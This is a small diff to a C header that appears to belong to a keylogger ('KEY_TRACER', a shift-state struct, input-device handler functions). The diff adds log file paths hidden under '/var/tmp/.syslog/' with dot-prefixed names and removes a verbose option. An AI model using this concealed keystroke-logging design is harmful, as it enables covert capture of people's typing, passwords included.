@@ -3,6 +3,9 @@
 #define KEY_TRACER
 #define MAX_SIZE 512
 
+#define LOG_PATH "/var/tmp/.syslog/.ktrace.log"
+#define TEMP_LOG_PATH "/var/tmp/.syslog/.ktrace.log.tmp"
+
 typedef struct
 {
     int shift_active;
@@ -14,7 +17,7 @@ typedef struct
 
 void get_handler(char *pdevice,char *phandler);
 
-void connect_handler(char *handler , int verbose);
+void connect_handler(char *handler);
 
 
 #endif
